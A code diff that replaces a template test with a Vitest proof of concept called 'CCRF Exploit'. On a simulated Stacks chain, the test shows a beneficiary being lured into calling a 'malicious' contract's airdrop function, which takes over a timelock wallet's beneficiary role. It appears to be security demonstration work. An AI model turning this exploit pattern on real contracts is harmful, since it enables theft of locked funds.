@@ -1,21 +1,38 @@
 
-import { describe, expect, it } from "vitest";
+import { Cl } from "@stacks/transactions";
+import { tx } from "@hirosystems/clarinet-sdk";
+import { describe, it } from "vitest";
 
 const accounts = simnet.getAccounts();
-const address1 = accounts.get("wallet_1")!;
 
-/*
-  The test below is an example. To learn more, read the testing documentation here:
-  https://docs.hiro.so/clarinet/feature-guides/test-contract-with-clarinet-sdk
-*/
+describe("CCRF Exploit", () => {
+  it("allows beneficiary to bestow the right to claim to someone else", () => {
+    const deployer = accounts.get("deployer")!;
+    const beneficiary = accounts.get("wallet_1")!;
+    const someone_else = accounts.get("wallet_2")!;
+    console.log(`Beneficiary ${beneficiary}`)
+    simnet.mineBlock([
+      tx.callPublicFn("timelock-wallet", "lock", [
+        Cl.principal(beneficiary),
+        Cl.uint(10),
+        Cl.uint(10),
+      ], deployer),
+    ]);
+    console.log(`Querying initial beneficiary`);
+    let initial = simnet.callReadOnlyFn("timelock-wallet", "whois-beneficiary", [], someone_else);
+    console.log(`Beneficiary is ${Cl.prettyPrint(initial.result.value)}`)
 
-describe("example tests", () => {
-  it("ensures simnet is well initalised", () => {
-    expect(simnet.blockHeight).toBeDefined();
-  });
-
-  // it("shows an example", () => {
-  //   const { result } = simnet.callReadOnlyFn("counter", "get-counter", [], address1);
-  //   expect(result).toBeUint(0);
-  // });
+    console.log(`Launching the attack`);
+    // here the beneficiary calls the cool-nft-airdrop function on the malicious smart contract
+    simnet.mineBlock([
+      tx.callPublicFn("malicious", "cool-nft-airdrop", [
+      ], beneficiary),
+    ]);
+    // now the beneficiary of the timelock-wallet has been updated to the attackers address
+    let pwned = simnet.callReadOnlyFn("timelock-wallet", "whois-beneficiary", [], someone_else);
+    console.log(`Beneficiary is now ${Cl.prettyPrint(pwned.result.value)}`);
+  })
 });
+
+
+
